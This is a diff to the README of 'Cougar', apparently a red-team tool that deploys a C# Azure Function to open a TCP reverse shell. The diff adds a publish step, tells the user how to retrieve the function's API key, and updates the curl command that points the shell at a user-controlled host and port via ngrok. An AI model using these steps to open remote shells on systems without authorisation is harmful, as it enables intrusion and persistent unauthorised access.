@@ -13,6 +13,7 @@ Cougar is a C# function that can be deployed to the Azure to establish a TCP rev
 cd src
 dotnet restore
 dotnet build
+dotnet publish
 cd ../terraform
 terraform init
 export TF_VAR_UniqueString=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
@@ -34,10 +35,12 @@ To make your listener accessible from the public internet, consider using a serv
 ngrok tcp 4444
 ```
 
-Navigate to your function, supplying your connection details and API key:
+Retrieve the API key in the Azure Portal by searching for "Function App", clicking on the new Function App resource, clicking "Manage", and clicking "Click to show" next to the default function key.
+
+Invoke your function, supplying your connection details and API key:
 
 ```bash
-curl "https://cougar$TF_VAR_UniqueString.azurewebsites.net/api/Cougar?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER"
+curl "https://cougar$TF_VAR_UniqueString.azurewebsites.net/api/Cougar?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER&code=YOUR_API_KEY"
 ```
 
 Your listener will now act as a reverse shell for the duration of the function invocation.
